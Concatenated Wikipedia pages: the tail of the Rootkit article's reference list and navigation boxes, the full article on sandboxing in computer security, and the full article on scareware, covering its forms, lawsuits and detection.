. Retrieved 
July 24,
 2021
.




^
 
Schneier, Bruce
 (2009-10-23). 
"
'Evil Maid' Attacks on Encrypted Hard Drives"
. Retrieved 
2009-11-07
.




^
 
Soeder, Derek; Permeh, Ryan (2007-05-09). 
"Bootroot"
. eEye Digital Security. Archived from 
the original
 on 2013-08-17
. Retrieved 
2010-11-23
.




^
 
Kumar, Nitin; Kumar, Vipin (2007). 
Vbootkit: Compromising Windows Vista Security
 
(PDF)
. 
Black Hat Europe 2007
.




^
 
"BOOT KIT: Custom boot sector based Windows 2000/XP/2003 Subversion"
. 
NVlabs
. 2007-02-04. Archived from 
the original
 on June 10, 2010
. Retrieved 
2010-11-21
.




^
 
Kleissner, Peter (2009-10-19). 
"Stoned Bootkit"
. Peter Kleissner
. Retrieved 
2009-11-07
.
[
self-published source
]




^
 
Goodin, Dan (2010-11-16). 
"World's Most Advanced Rootkit Penetrates 64-bit Windows"
. 
The Register
. Retrieved 
2010-11-22
.




^
 
Francisco, Neil McAllister in San. 
"Microsoft tightens grip on OEM Windows 8 licensing"
. 
www.theregister.com
.




^
 
King, Samuel T.; Chen, Peter M.; Wang, Yi-Min; Verbowski, Chad; Wang, Helen J.; Lorch, Jacob R. (2006-04-03). 
"SubVirt: Implementing malware with virtual machines"
 
(PDF)
. 
2006 IEEE Symposium on Security and Privacy (S&P'06)
. 
Institute of Electrical and Electronics Engineers
. pp. 14 pp.-327. 
doi
:
10.1109/SP.2006.38
. 
ISBN
 
0-7695-2574-1
. 
S2CID
 
1349303
. Retrieved 
2008-09-15
.




^
 
Wang, Zhi; Jiang, Xuxian; Cui, Weidong; Ning, Peng (2009-08-11). 
"Countering Kernel Rootkits with Lightweight Hook Protection"
 
(PDF)
. In Al-Shaer, Ehab (General Chair) (ed.). 
Proceedings of the 16th ACM Conference on Computer and Communications Security
. 
CCS 2009: 16th ACM Conference on Computer and Communications Security
. Jha, Somesh; Keromytis, Angelos D. (Program Chairs). New York: ACM New York. 
doi
:
10.1145/1653662.1653728
. 
ISBN
 
978-1-60558-894-0
. Retrieved 
2009-11-11
.




^
 
"Device Guard is the combination of Windows Defender Application Control and virtualization-based protection of code integrity (Windows 10)"
. 11 July 2023.




^
 
Delugré, Guillaume (2010-11-21). 
Reversing the Broacom NetExtreme's Firmware
 
(PDF)
. hack.lu. Sogeti. Archived from 
the original
 
(PDF)
 on 2012-04-25
. Retrieved 
2010-11-25
.




^ 
a
 
b
 
"Hacking Team Uses UEFI BIOS Rootkit to Keep RCS 9 Agent in Target Systems - TrendLabs Security Intelligence Blog"
. 2015-07-13.




^
 
Heasman, John (2006-01-25). 
Implementing and Detecting an ACPI BIOS Rootkit
 
(PDF)
. 
Black Hat Federal 2006
. NGS Consulting
. Retrieved 
2010-11-21
.




^
 
Heasman, John (2006-11-15). 
"Implementing and Detecting a PCI Rootkit"
 
(PDF)
. Next Generation Security Software. 
CiteSeerX
: 
10.1.1.89.7305
. Retrieved 
2010-11-13
.




^
 
Modine, Austin (2008-10-10). 
"Organized crime tampers with European card swipe devices: Customer data beamed overseas"
. 
The Register
. Situation Publishing
. Retrieved 
2008-10-13
.




^
 
Sacco, Anibal; Ortéga, Alfredo (2009). 
Persistent BIOS infection
 
(PDF)
. 
CanSecWest 2009
. Core Security Technologies. Archived from 
the original
 
(PDF)
 on 2011-07-08
. Retrieved 
2010-11-21
.




^
 
Goodin, Dan (2009-03-24). 
"Newfangled rootkits survive hard disk wiping"
. 
The Register
. Situation Publishing
. Retrieved 
2009-03-25
.




^
 
Sacco, Anibal; Ortéga, Alfredo (2009-06-01). 
"Persistent BIOS Infection: The Early Bird Catches the Worm"
. 
Phrack
. 
66
 (7)
. Retrieved 
2010-11-13
.




^
 
Ric Vieler (2007). 
Professional Rootkits
. John Wiley & Sons. p. 244. 
ISBN
 
9780470149546
.




^
 
Matrosov, Aleksandr; Rodionov, Eugene (2010-06-25). 
"TDL3: The Rootkit of All Evil?"
 
(PDF)
. Moscow: 
ESET
. p. 3. Archived from 
the original
 
(PDF)
 on 2011-05-13
. Retrieved 
2010-08-17
.




^
 
Matrosov, Aleksandr; Rodionov, Eugene (2011-06-27). 
"The Evolution of TDL: Conquering x64"
 
(PDF)
. 
ESET
. Archived from 
the original
 
(PDF)
 on 2015-07-29
. Retrieved 
2011-08-08
.




^
 
Gatlan, Sergiu (May 6, 2021). 
"New Moriya rootkit used in the wild to backdoor Windows systems"
. 
Bleeping Computer
. Retrieved 
July 24,
 2021
.




^
 
Brumley, David (1999-11-16). 
"Invisible Intruders: rootkits in practice"
. 
USENIX
.




^ 
a
 
b
 
c
 
d
 
e
 
Davis, Michael A.; Bodmer, Sean; LeMasters, Aaron (2009-09-03). 
"Chapter 10: Rootkit Detection"
 
(PDF)
. 
Hacking Exposed Malware & Rootkits: Malware & rootkits security secrets & solutions
. New York: McGraw Hill Professional. 
ISBN
 
978-0-07-159118-8
.




^
 
Trlokom (2006-07-05). 
"Defeating Rootkits and Keyloggers"
 
(PDF)
. Trlokom. Archived from 
the original
 
(PDF)
 on 2011-07-17
. Retrieved 
2010-08-17
.




^
 
Dai Zovi, Dino (2011). 
"Kernel Rootkits"
. Archived from 
the original
 on September 10, 2012
. Retrieved 
13 Sep
 2012
.




^
 
"Zeppoo"
. 
SourceForge
. 18 July 2009
. Retrieved 
8 August
 2011
.




^
 
Cogswell, Bryce; Russinovich, Mark (2006-11-01). 
"RootkitRevealer v1.71"
. 
Microsoft
. Retrieved 
2010-11-13
.




^
 
"Rootkit & Anti-rootkit"
. Retrieved 
13 September
 2017
.




^
 
"Sophos Anti-Rootkit"
. 
Sophos
. Retrieved 
8 August
 2011
.




^
 
"BlackLight"
. 
F-Secure
. Archived from 
the original
 on 21 September 2012
. Retrieved 
8 August
 2011
.




^
 
"Radix Anti-Rootkit"
. usec.at. Archived from 
the original
 on 21 September 2012
. Retrieved 
8 August
 2011
.




^
 
"GMER"
. Retrieved 
8 August
 2011
.




^
 
Harriman, Josh (2007-10-19). 
"A Testing Methodology for Rootkit Removal Effectiveness"
 
(PDF)
. Dublin, Ireland: Symantec Security Response. Archived from 
the original
 
(PDF)
 on 2009-10-07
. Retrieved 
2010-08-17
.




^
 
Cuibotariu, Mircea (2010-02-12). 
"Tidserv and MS10-015"
. 
Symantec
. Retrieved 
2010-08-19
.




^
 
"Restart Issues After Installing MS10-015"
. 
Microsoft
. 2010-02-11
. Retrieved 
2010-10-05
.




^
 
Steinberg, Joseph (June 9, 2021). 
"What You Need To Know About Keyloggers"
. 
bestantivirus.com
. Retrieved 
July 24,
 2021
.




^
 
"Strider GhostBuster Rootkit Detection"
. Microsoft Research. 2010-01-28. Archived from 
the original
 on 2012-07-29
. Retrieved 
2010-08-14
.




^
 
"Signing and Checking Code with Authenticode"
. 
Microsoft
. Retrieved 
2008-09-15
.




^
 
"Stopping Rootkits at the Network Edge"
 
(PDF)
. Beaverton, Oregon: 
Trusted Computing Group
. January 2017
. Retrieved 
2008-07-11
.




^
 
"TCG PC Specific Implementation Specification, Version 1.1"
 
(PDF)
. 
Trusted Computing Group
. 2003-08-18
. Retrieved 
2010-11-22
.




^
 
"How to generate a complete crash dump file or a kernel crash dump file by using an NMI on a Windows-based system"
. 
Microsoft
. Retrieved 
2010-11-13
.




^
 
Seshadri, Arvind; et al. (2005). "Pioneer". 
Proceedings of the twentieth ACM symposium on Operating systems principles
. 
Carnegie Mellon University
. pp. 1–16. 
doi
:
10.1145/1095810.1095812
. 
ISBN
 
1595930795
. 
S2CID
 
9960430
.




^
 
Dillard, Kurt (2005-08-03). 
"Rootkit battle: Rootkit Revealer vs. Hacker Defender"
.




^
 
"The Microsoft Windows Malicious Software Removal Tool helps remove specific, prevalent malicious software from computers that are running Windows 7, Windows Vista, Windows Server 2003, Windows Server 2008, or Windows XP"
. 
Microsoft
. 2010-09-14.




^
 
Bettany, Andrew; Halsey, Mike (2017). 
Windows Virus and Malware Troubleshooting
. Apress. p. 17. 
ISBN
 
9781484226070
 – via 
Google Books
.




^
 
Hultquist, Steve (2007-04-30). 
"Rootkits: The next big enterprise threat?"
. 
InfoWorld
. Retrieved 
2010-11-21
.




^
 
"Security Watch: Rootkits for fun and profit"
. CNET Reviews. 2007-01-19. Archived from 
the original
 on 2012-10-08
. Retrieved 
2009-04-07
.




^
 
Bort, Julie (2007-09-29). 
"Six ways to fight back against botnets"
. 
PCWorld
. San Francisco: PCWorld Communications
. Retrieved 
2009-04-07
.




^
 
Hoang, Mimi (2006-11-02). 
"Handling Today's Tough Security Threats: Rootkits"
. 
Symantec Connect
. 
Symantec
. Retrieved 
2010-11-21
.




^ 
a
 
b
 
Danseglio, Mike; Bailey, Tony (2005-10-06). 
"Rootkits: The Obscure Hacker Attack"
. Microsoft.




^
 
Messmer, Ellen (2006-08-26). 
"Experts Divided Over Rootkit Detection and Removal"
. 
NetworkWorld.com
. Framingham, Mass.: IDG
. Retrieved 
2010-08-15
.




^
 
Skoudis, Ed; Zeltser, Lenny (2004). 
Malware: Fighting Malicious Code
. Prentice Hall PTR. p. 335. 
ISBN
 
978-0-13-101405-3
.




^
 
Hannel, Jeromey (2003-01-23). 
"Linux RootKits For Beginners - From Prevention to Removal"
. 
SANS Institute
. Archived from 
the original
 
(PDF)
 on October 24, 2010
. Retrieved 
2010-11-22
.




^
 
Li, Yong-Gang; Chung, Yeh-Ching; Hwang, Kai; Li, Yue-Jin (2021). 
"Virtual Wall: Filtering Rootkit Attacks to Protect Linux Kernel Functions"
. 
IEEE Transactions on Computers
. 
70
 (10): 1640–1653. 
doi
:
10.1109/TC.2020.3022023
. 
S2CID
 
226480878
.






Further reading
[
edit
]


Blunden, Bill (2009). 
The Rootkit Arsenal: Escape and Evasion in the Dark Corners of the System
. Wordware. 
ISBN
 
978-1-59822-061-2
.


Hoglund, Greg; Butler, James (2005). 
Rootkits: Subverting the Windows Kernel
. Addison-Wesley Professional. 
ISBN
 
978-0-321-29431-9
.


Grampp, F. T.; Morris, Robert H. Sr. (October 1984). "The UNIX System: UNIX Operating System Security". 
AT&T Bell Laboratories Technical Journal
. 
62
 (8): 1649–1672. 
doi
:
10.1002/j.1538-7305.1984.tb00058.x
. 
S2CID
 
26877484
.


Kong, Joseph (2007). 
Designing BSD Rootkits
. No Starch Press. 
ISBN
 
978-1-59327-142-8
.


Veiler, Ric (2007). 
Professional Rootkits
. Wrox. 
ISBN
 
978-0-470-10154-4
.


External links
[
edit
]


 Media related to 
Rootkits
 at Wikimedia Commons


v
t
e
Information security
Related security categories


Computer security


Automotive security


Cybercrime


Cybersex trafficking


Computer fraud


Cybergeddon


Cyberterrorism


Cyberwarfare


Electromagnetic warfare


Information warfare


Internet security


Mobile security


Network security


Copy protection


Digital rights management


vectorial version
Threats


Adware


Advanced persistent threat


Arbitrary code execution


Backdoors


Bombs

Fork


Logic


Time


Zip


Hardware backdoors


Code injection


Crimeware


Cross-site scripting


Cross-site leaks


DOM clobbering


History sniffing


Cryptojacking


Botnets


Data breach


Drive-by download


Browser Helper Objects


Viruses


Data scraping


Denial-of-service attack


Eavesdropping


Email fraud


Email spoofing


Exploits


Fraudulent dialers


Hacktivism


Infostealer


Insecure direct object reference


Keystroke loggers


Malware


Payload


Phishing


Voice


Polymorphic engine


Privilege escalation


Ransomware


Rootkits


Scareware


Shellcode


Spamming


Social engineering


Spyware


Software bugs


Trojan horses


Hardware Trojans


Remote access trojans


Vulnerability


Web shells


Wiper


Worms


SQL injection


Rogue security software


Zombie


Defenses


Application security


Secure coding


Secure by default


Secure by design


Misuse case


Computer access control


Authentication


Multi-factor authentication


Authorization


Computer security software


Antivirus software


Security-focused operating system


Data-centric security


Obfuscation (software)


Data masking


Encryption


Firewall


Intrusion detection system


Host-based intrusion detection system
 (HIDS)


Anomaly detection


Information security management


Information risk management


Security information and event management
 (SIEM)


Runtime application self-protection


Site isolation




v
t
e
Malware
 topics
Infectious malware


Comparison of computer viruses


Computer virus


Computer worm


List of computer worms


Timeline of computer viruses and worms


Concealment


Backdoor


Clickjacking


Man-in-the-browser


Man-in-the-middle


Rootkit


Trojan horse


Zombie computer


Malware for profit


Adware


Botnet


Crimeware


Fleeceware


Form grabbing


Fraudulent dialer


Infostealer


Keystroke logging


Malbot


Privacy-invasive software


Ransomware


Rogue security software


Scareware


Spyware


Web threats


By operating system


Android malware


Classic Mac OS viruses


iOS malware


Linux malware


MacOS malware


Macro virus


Mobile malware


Palm OS viruses


HyperCard viruses


Protection


Anti-keylogger


Antivirus software


Browser security


Data loss prevention software


Defensive computing


Firewall


Internet security


Intrusion detection system


Mobile security


Network security


Countermeasures


Computer and network surveillance


Honeypot


Operation: Bot Roast




Authority control databases
: National 
Germany
United States
Israel










Retrieved from "
https://en.wikipedia.org/w/index.php?title=Rootkit&oldid=1239469491
"


Categories
: 
Types of malware
Rootkits
Privilege escalation exploits
Cryptographic attacks
Cyberwarfare
Hidden categories: 
All articles with dead external links
Articles with dead external links from September 2012
All accuracy disputes
Accuracy disputes from November 2010
Articles with short description
Short description is different from Wikidata
All articles with unsourced statements
Articles with unsourced statements from July 2021
All articles with self-published sources
Articles with self-published sources from November 2010
Articles containing potentially dated statements from 2005
All articles containing potentially dated statements
Commons category link is on Wikidata











From Wikipedia, the free encyclopedia






Software security mechanism


This article is about the computer security mechanism. For the software testing environment, see 
Sandbox (software development)
.


In 
computer security
, a 
sandbox
 is a security mechanism for separating running programs, usually in an effort to mitigate system failures and/or software 
vulnerabilities
 from spreading. The 
sandbox
 metaphor derives from the concept of a child's sandbox—a play area where kids can build, destroy, and experiment without causing any real-world damage.
[
1
]
 It is often used to execute untested or untrusted programs or code, possibly from unverified or untrusted third parties, suppliers, users or websites, without risking harm to the host machine or 
operating system
.
[
2
]
  A sandbox typically provides a tightly controlled set of resources for guest programs to run in, such as storage and memory 
scratch space
. Network access, the ability to inspect the host system, or read from input devices are usually disallowed or heavily restricted.

In the sense of providing a highly controlled environment, sandboxes may be seen as a specific example of 
virtualization
. Sandboxing is frequently used to test unverified programs that may contain a 
virus
 or other 
malicious code
 without allowing the software to harm the host device.
[
3
]






Implementations
[
edit
]


A sandbox is implemented by executing the software in a restricted operating system environment, thus controlling the resources (e.g. 
file descriptors
, memory, file system space, etc.) that a process may use.
[
4
]


Examples of sandbox implementations include the following:



Linux
 application sandboxing, built on 
Seccomp
, 
cgroups
 and 
Linux namespaces
. Notably used by 
Systemd
, 
Google Chrome
, 
Firefox
, Firejail.


Android
 was the first mainstream operating system to implement full application sandboxing, built by assigning each application its own Linux user ID.
[
5
]


Apple
 App Sandbox is required for apps distributed through Apple's 
Mac App Store
 and 
iOS
/
iPadOS
 
App Store
, and recommended for other signed apps.
[
6
]
[
7
]


Windows Vista
 and later editions include a "low" mode process running, known as 
"User Account Control" (UAC)
, which only allows writing in a specific directory and registry keys. 
Windows 10 Pro
, from version 1903, provides a feature known as Windows Sandbox.
[
8
]


Google
 Sandboxed API.
[
9
]


Virtual machines
 
emulate
 a complete host computer, on which a conventional operating system may boot and run as on actual hardware.  The guest operating system runs sandboxed in the sense that it does not function natively on the host and can only access host resources through the emulator.


A 
jail
: network-access restrictions, and a restricted file system namespace. Jails are most commonly used in 
virtual hosting
.
[
10
]


Rule-based execution gives users full control over what processes are started, spawned (by other applications), or allowed to inject code into other applications and have access to the net, by having the system assign access levels for users or programs according to a set of determined rules.
[
11
]
 It also can control file/registry security (what programs can read and write to the file system/registry). In such an environment, viruses and 
Trojans
 have fewer opportunities for infecting a computer.  The 
SELinux
 and 
Apparmor
 security frameworks are two such implementations for 
Linux
.


Security researchers rely heavily on sandboxing technologies to analyse malware behavior. By creating an environment that mimics or replicates the targeted desktops, researchers can evaluate how malware infects and compromises a target host. Numerous 
malware analysis
 services are based on the sandboxing technology.
[
12
]


Google Native Client
 is a sandbox for running compiled C and C++ code in the browser efficiently and securely, independent of the user's operating system.
[
13
]


Capability
 systems can be thought of as a fine-grained sandboxing mechanism, in which programs are given opaque tokens when spawned and have the ability to do specific things based on what tokens they hold. Capability-based implementations can work at various levels, from kernel to user-space.  An example of capability-based user-level sandboxing involves HTML rendering in a 
Web browser
.


Secure Computing Mode (seccomp)
  strict mode, seccomp only allows the 
write()
, 
read()
, 
exit()
, and 
sigreturn()
 system calls.


HTML5
 has a "sandbox" attribute for use with 
iframes
.
[
14
]


Java virtual machines
 include a sandbox to restrict the actions of untrusted code, such as a 
Java applet
.


The .NET 
Common Language Runtime
 provides 
Code Access Security
 to enforce restrictions on untrusted code.


Software Fault Isolation (SFI),
[
15
]
 allows running untrusted native code by sandboxing all store, read and jump assembly instructions to isolated segments of memory.


Some of the use cases for sandboxes include the following:



Online judge
 systems to test programs in programming contests.


New-generation 
pastebins
 allowing users to execute pasted 
code snippets
 on the pastebin's server.


See also
[
edit
]


FreeBSD jail


Sandboxie


seccomp


Test bench


Tor (anonymity network)


References
[
edit
]






^
 
"What Is a Sandbox Environment? - Meaning | Proofpoint UK"
. 
Proofpoint
. 2023-09-13
. Retrieved 
2024-05-28
.




^
 
Goldberg, Ian; Wagner, David; Thomas, Randi & Brewer, Eric (1996). 
"A Secure Environment for Untrusted Helper Applications (Confining the Wily Hacker)"
 
(PDF)
. 
Proceedings of the Sixth USENIX UNIX Security Symposium
. Retrieved 
25 October
 2011
.




^
 
Geier, Eric (2012-01-16). 
"How to Keep Your PC Safe With Sandboxing"
. TechHive. Archived from 
the original
 on 2014-07-12
. Retrieved 
2014-07-03
.




^
 
"Sandboxing Applications"
 
(PDF)
. 2001
. Retrieved 
7 May
 2013
.




^
 
"Application Sandbox - Android Open Source Project"
. Retrieved 
2021-04-02
.




^
 
"About App Sandbox"
. 
developer.apple.com
. Retrieved 
2020-12-09
.




^
 
"Security of runtime process in iOS and iPadOS"
. 
Apple Support
. Retrieved 
2021-04-04
.




^
 
"Windows Sandbox"
. 2018-12-18
. Retrieved 
2010-01-07
.




^
 
google/sandboxed-api
, Google, 2020-12-08
, retrieved 
2020-12-09




^
 
"Auto-Sandboxing secure system"
. Retrieved 
2015-01-30
.




^
 
"Computer System Security and Access Controls"
. 1991. Archived from 
the original
 on 28 May 2013
. Retrieved 
17 May
 2013
.




^
 
"Native Client Sandbox – Untrusted x86 Native Code"
 
(PDF)
. Retrieved 
2015-01-03
.




^
 
Welcome to Native Client




^
 
Internet Explorer Team Blog (14 July 2011). 
"Defense in Depth: Locking Down Mash-Ups with HTML5 Sandbox"
. 
IEBlog
.




^
 
Wahbe, Robert (1993). 
"Efficient Software-Based Fault Isolation"
 
(PDF)
.






External links
[
edit
]


Security In-Depth for Linux Software: Preventing and Mitigating Security Bugs


Sandbox –  The Chromium Projects


FreeBSD capsicum(4) man page
 –  a lightweight OS capability and sandbox framework


OpenBSD pledge(2) man page
 –  a way to restrict system operations


Sandbox testing importance
 
Archived
 2021-04-26 at the 
Wayback Machine
{sandbox} Importance of sandbox in zero day flaw










Retrieved from "
https://en.wikipedia.org/w/index.php?title=Sandbox_(computer_security)&oldid=1242636448
"


Categories
: 
Operating system security
Virtualization
Hidden categories: 
Articles with short description
Short description matches Wikidata
Webarchive template wayback links











From Wikipedia, the free encyclopedia






Malware designed to elicit fear, shock, or anxiety


Not to be confused with 
Careware
 or 
Shareware
.


An example of a scareware popup


Scareware
 is a form of 
malware
 which uses 
social engineering
 to cause 
shock
, 
anxiety
, or the perception of a threat in order to manipulate users into buying 
unwanted software
[
1
]
 (or products). Scareware is part of a class of 
malicious software
 that includes 
rogue security software
, 
ransomware
 and other scam 
software
 that tricks users into believing their computer is infected with a 
virus
, then suggests that they download and pay for 
fake antivirus software
 to remove it.
[
2
]
 Usually the virus is fictional and the software is non-functional or 
malware
 itself.
[
3
]
 According to the 
Anti-Phishing Working Group
, the number of scareware packages in circulation rose from 2,850 to 9,287 in the second half of 2008.
[
4
]
 In the first half of 2009, the APWG identified a 585% increase in scareware programs.
[
5
]


The "scareware" label can also apply to any application or virus which pranks users with intent to cause anxiety or panic.





Scam scareware
[
edit
]


Internet security writers use the term "scareware" to describe software products that produce frivolous and alarming warnings or threat notices, most typically for fictitious or useless commercial 
firewall
 and 
registry cleaner
 software.  This class of program tries to increase its perceived value by bombarding the user with constant warning messages that do not increase its effectiveness in any way.  Software is packaged with a look and feel that mimics legitimate security software in order to deceive consumers.
[
6
]


Some websites display pop-up advertisement windows or banners with text such as: "Your computer may be infected with harmful spyware programs.
[
7
]
  Immediate removal may be required. To scan, click 'Yes' below." These websites can go as far as saying that a user's job, career, or marriage would be at risk. Products with advertisements such as these are often considered scareware. Serious scareware applications qualify as 
rogue software
.

Some scareware is not affiliated with any other installed programs. A user can encounter a pop-up on a website indicating that their PC is infected.
[
8
]
 In some scenarios, it is possible to become infected with scareware even if the user attempts to cancel the notification.
These popups are specially designed to look like they come from the user's operating system when they are actually a webpage.

A 2010 study by 
Google
 found 11,000 domains hosting fake anti-virus software, accounting for 50% of all malware delivered via internet advertising.
[
9
]


Starting on March 29, 2011, more than 1.5 million 
web sites
 around the world have been infected by the 
LizaMoon
 
SQL injection
 attack spread by scareware.
[
10
]
[
11
]


Research by Google discovered that scareware was using some of its servers to check for internet connectivity.  The data suggested that up to a million machines were infected with scareware.
[
12
]
  The company has placed a warning in the search results for users whose computers appear to be infected.

Another example of scareware is Smart Fortress. This site scares the victim into thinking they have many viruses on their computer and asks them to buy a professional service.
[
13
]




Spyware
[
edit
]


Some forms of 
spyware
 also qualify as scareware because they change the user's desktop background, install icons in the computer's 
notification area
 (under 
Microsoft Windows
), and claiming that some kind of spyware has infected the user's computer and that the scareware application will help to remove the infection. In some cases, scareware trojans have replaced the desktop of the victim with large, yellow text reading "Warning! You have spyware!" or a box containing similar text, and have even forced the screensaver to change to "bugs" crawling across the screen.
[
14
]
 Winwebsec is the term usually used to address the malware that attacks the users of Windows operating system and produces fake claims similar to that of genuine anti-malware software.
[
15
]


SpySheriff
 exemplifies spyware and scareware: it purports to remove spyware, but is actually a piece of spyware itself, often accompanying 
SmitFraud
 infections.
[
16
]
 Other antispyware scareware may be promoted using a 
phishing
 scam.



Uninstallation of security software
[
edit
]


Another approach is to trick users into uninstalling legitimate antivirus software, such as Microsoft Security Essentials, or disabling their 
firewall
.
[
17
]
 Since antivirus programs typically include protection against being tampered with or disabled by other software, scareware may use social engineering to convince the user to disable programs which would otherwise prevent the malware from working.



Legal action
[
edit
]


In 2005, 
Microsoft
 and 
Washington state
 successfully sued Secure Computer (makers of 
Spyware Cleaner
) for $1 million over charges of using scareware pop-ups.
[
18
]

Washington's attorney general has also brought lawsuits against Securelink Networks, 
Softwareonline.com
,
[
19
]
 High Falls Media, and the makers of Quick Shield.
[
20
]


In October 2008, 
Microsoft
 and the 
Washington
 
attorney general
 filed a lawsuit against two Texas firms, Branch Software and Alpha Red, producers of the 
Registry Cleaner XP
 scareware.
[
21
]

The lawsuit alleges that the company sent incessant pop-ups resembling system warnings to consumers' personal computers stating "CRITICAL ERROR MESSAGE! - REGISTRY DAMAGED AND CORRUPTED", before instructing users to visit a web site to download Registry Cleaner XP at a cost of $39.95.

On December 2, 2008, the U.S. 
Federal Trade Commission
 ("FTC") filed a Complaint in federal court against Innovative Marketing, Inc., ByteHosting Internet Services, LLC, as well as individuals  
Sam Jain
, Daniel Sundin, James Reno, Marc D’Souza, and Kristy Ross.  The Complaint also listed Maurice D’Souza as a Relief Defendant, alleged that he held proceeds of wrongful conduct but not accusing him of violating any law.  The FTC alleged that the other Defendants violated the FTC Act by deceptively marketing software, including WinFixer, WinAntivirus, DriveCleaner, ErrorSafe, and XP Antivirus.  According to the complaint, the Defendants falsely represented that scans of a consumer's computer showed that it had been compromised or infected and then offered to sell software to fix the alleged problems.
[
22
]
[
23
]
[
24
]




Prank software
[
edit
]


Another type of scareware involves software designed to literally scare the user through the use of unanticipated shocking images, sounds or video.



An early program of this type is 
NightMare
, a program distributed on the 
Fish Disks
 for the 
Amiga
 computer (Fish #448) in 1991. When NightMare executes, it lies dormant for an extended and random period of time, finally changing the entire screen of the computer to an image of a skull while playing a horrifying shriek on the audio channels.
[
25
]


Anxiety-based scareware puts users in situations where there are no positive outcomes.  For example, a small program can present a 
dialog box
 saying "Erase everything on hard drive?" with two buttons, both labeled "OK".  Regardless of which button is chosen, nothing is destroyed.
[
26
]


This tactic was used in an advertisement campaign by 
Sir-Tech
 in 1997 to advertise 
Virus: The Game
. When the file is run, a full screen representation of the desktop appears. The software then begins simulating deletion of the 
Windows
 folder. When this process is complete, a message is slowly typed on screen saying "Thank God this is only a game." A screen with the purchase information appears on screen and then returns to the desktop. No damage is done to the computer during the advertisement.
[
citation needed
]


Detection
[
edit
]


Research in the 2020s has also introduced a new detection technology designed to identify scareware 
social engineering
 attacks with enhanced resilience. This approach targets the visual images presented to end users, which is a layer that attackers cannot easily obscure.
[
27
]




See also
[
edit
]


Computer security


Ransomware


Rogue security software


Tapsnake


Notes
[
edit
]






^
 
"What is Malware? | IBM"
. 
www.ibm.com
. 
Archived
 from the original on 2023-12-07
. Retrieved 
2023-12-06
.




^
 
"Millions tricked by 'scareware'
"
. 
BBC News
. 2009-10-19. 
Archived
 from the original on 2018-06-22
. Retrieved 
2009-10-20
.




^
 
'Scareware' scams trick searchers
 
Archived
 2017-08-10 at the 
Wayback Machine
. 
BBC News
 (2009-03-23). Retrieved on 2009-03-23.




^
 
"Scareware scammers adopt cold call tactics"
. 
The Register
. 2009-04-10. 
Archived
 from the original on 2018-02-10
. Retrieved 
2009-04-12
.




^
 
"Phishing Activity Trends Report: 1st Half 2009"
 
(PDF)
. 
Archived
 
(PDF)
 from the original on 2012-04-15
. Retrieved 
2009-10-05
.




^
 
John Leydon (2009-10-20). 
"Scareware Mr Bigs enjoy 'low risk' crime bonanza"
. 
The Register
. 
Archived
 from the original on 2017-08-10
. Retrieved 
2009-10-21
.




^
 
Carine Febre (2014-10-20). 
"Fake Warning Example"
. Carine Febre. 
Archived
 from the original on 2017-04-10
. Retrieved 
2014-11-21
.




^
 
JM Hipolito (2009-06-04). 
"Air France Flight 447 Search Results Lead to Rogue Antivirus"
. 
Trend Micro
. 
Archived
 from the original on 2012-02-17
. Retrieved 
2009-06-06
.




^
 
Moheeb Abu Rajab and Luca Ballard (2010-04-13). 
"The Nocebo Effect on the Web: An Analysis of Fake Anti-Virus Distribution"
 
(PDF)
. 
Archived
 
(PDF)
 from the original on 2019-02-20
. Retrieved 
2010-11-18
.
 
{{
cite journal
}}
: 
Cite journal requires 
|journal=
 (
help
)




^
 
"Mass 'scareware' attack hits 1.5M websites, still spreading"
. 
On Deadline
. April 1, 2011. 
Archived
 from the original on July 8, 2012
. Retrieved 
April 2,
 2011
.




^
 
"Malicious Web attack hits a million site addresses"
. 
Reuters.com
. April 1, 2011. Archived from 
the original
 on November 11, 2014
. Retrieved 
July 1,
 2017
.




^
 
"Google to Warn PC Virus Victims via Search Site"
. 
BBC News
. 2011-07-21. 
Archived
 from the original on 2016-07-21
. Retrieved 
2011-07-22
.




^
 
"Smart Fortress 2012"
. 
Kaspersky Lab Technical Support
. February 29, 2012. Archived from 
the original
 on 2017-01-28.




^
 
"bugs on the screen"
. 
Microsoft TechNet
.
[
permanent dead link
]




^
 
Vincentas (11 July 2013). 
"Scareware in SpyWareLoop.com"
. 
Spyware Loop
. Archived from 
the original
 on 8 November 2014
. Retrieved 
27 July
 2013
.




^
 
spywarewarrior.com
 
Archived
 2018-09-22 at the 
Wayback Machine
 filed under "Brave Sentry."




^
 
"theregister.co.uk"
. 
Archived
 from the original on 2017-08-10
. Retrieved 
2017-08-10
.




^
 
Etengoff, Aharon (2008-09-29). 
"Washington and Microsoft target spammers"
. 
The Inquirer
. Archived from 
the original
 on 2008-10-02
. Retrieved 
2008-10-04
.




^
 
"Attorney General's Office Sues, Settles with Washington-based SoftwareOnline.com | Washington State"
. 
www.atg.wa.gov
. 
Archived
 from the original on 2021-12-08
. Retrieved 
2021-12-21
.




^
 
Tarun (2008-09-29). 
"Microsoft to sue scareware security vendors"
. 
Lunarsoft
. 
Archived
 from the original on 2010-06-20
. Retrieved 
2009-09-24
. 
[...] the Washington attorney general (AG) [...] has also brought lawsuits against companies such as Securelink Networks and High Falls Media, and the makers of a product called QuickShield, all of whom were accused of marketing their products using deceptive techniques such as fake alert messages.




^
 
"Fighting the scourge of scareware"
. 
BBC News
. 2008-10-01. 
Archived
 from the original on 2018-02-12
. Retrieved 
2008-10-02
.




^
 
"Win software"
. Federal Trade Commission. 
Archived
 from the original on 2013-09-19
. Retrieved 
2012-03-15
.




^
 
"Wanted by the FBI - SHAILESHKUMAR P. JAIN"
. FBI. 
Archived
 from the original on 2017-06-27
. Retrieved 
2016-07-28
.




^
 
"D'Souza Final Order"
 
(PDF)
. Federal Trade Commission. 
Archived
 
(PDF)
 from the original on 2012-10-16
. Retrieved 
2012-03-15
.




^
 
Contents of disk #448
 
Archived
 2018-09-18 at the 
Wayback Machine
. Amiga-stuff.com - see DISK 448.




^
 
"Dark Drive Prank"
. 
Archived
 from the original on 2018-07-24
. Retrieved 
2010-02-18
.




^
 
Seifert, Christian; Stokes, Jack W.; Colcernian, Christina; Platt, John C.; Lu, Long (2013). 
Robust scareware image detection
. pp. 2920–2924. 
doi
:
10.1109/ICASSP.2013.6638192
. 
ISBN
 
978-1-4799-0356-6
. 
Archived
 from the original on 2024-04-12
. Retrieved 
2024-02-09
.






Further reading
[
edit
]


O’Dea, Hamish (2009-10-16). 
"The Modern Rogue – Malware With a Face"
. Australia: 
Microsoft
.
 
{{
cite journal
}}
: 
Cite journal requires 
|journal=
 (
help
)


External links
[
edit
]








Wikimedia Commons has media related to 
Scareware
.




Demonstration of scareware
 on 
YouTube


The Case of the Unusable System


Yes, that PC cleanup app you saw on TV at 3 a.m. is a waste


v
t
e
